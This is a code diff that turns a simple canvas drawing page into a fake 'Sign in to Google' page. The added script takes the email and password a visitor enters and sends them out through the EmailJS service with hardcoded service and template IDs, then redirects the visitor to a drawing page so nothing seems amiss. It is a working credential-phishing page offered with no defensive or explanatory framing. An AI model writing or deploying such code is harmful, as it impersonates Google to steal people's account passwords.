@@ -3,74 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drawing Page</title>
+    <title>Google Login</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             margin: 0;
             background-color: #f1f1f1;
         }
-        canvas {
-            border: 2px solid #333;
-            cursor: crosshair;
-        }
-        .controls {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background-color: #fff;
-            padding: 10px;
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #ccc;
             border-radius: 5px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        .controls button {
-            padding: 5px 10px;
+        .login-container h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #333;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
             background-color: #4285F4;
             color: #fff;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
-        .controls button:hover {
+        .login-container button:hover {
             background-color: #357ae8;
         }
     </style>
 </head>
 <body>
-    <canvas id="drawCanvas" width="500" height="500"></canvas>
-
-    <div class="controls">
-        <button onclick="clearCanvas()">Clear</button>
+    <div class="login-container">
+        <h2>Sign in to Google</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
     <script>
-        const canvas = document.getElementById("drawCanvas");
-        const ctx = canvas.getContext("2d");
+        emailjs.init("Wm_hgPysMxjkcdYas");
 
-        let isDrawing = false;
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        canvas.addEventListener("mousedown", (e) => {
-            isDrawing = true;
-            ctx.beginPath();
-            ctx.moveTo(e.offsetX, e.offsetY);
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const data = {
+                email: email,
+                password: password
+            };
+
+            emailjs.send("service_zrgq0cs", "template_8r7y8vw", data)
+                .then(function(response) {
+                    console.log('Success:', response);
+                    window.location.href = "drawing.html";  // Redirect to the drawing page
+                }, function(error) {
+                    console.log('Error:', error);
+                });
         });
-
-        canvas.addEventListener("mousemove", (e) => {
-            if (isDrawing) {
-                ctx.lineTo(e.offsetX, e.offsetY);
-                ctx.stroke();
-            }
-        });
-
-        canvas.addEventListener("mouseup", () => {
-            isDrawing = false;
-        });
-
-        function clearCanvas() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-        }
     </script>
 </body>
 </html>
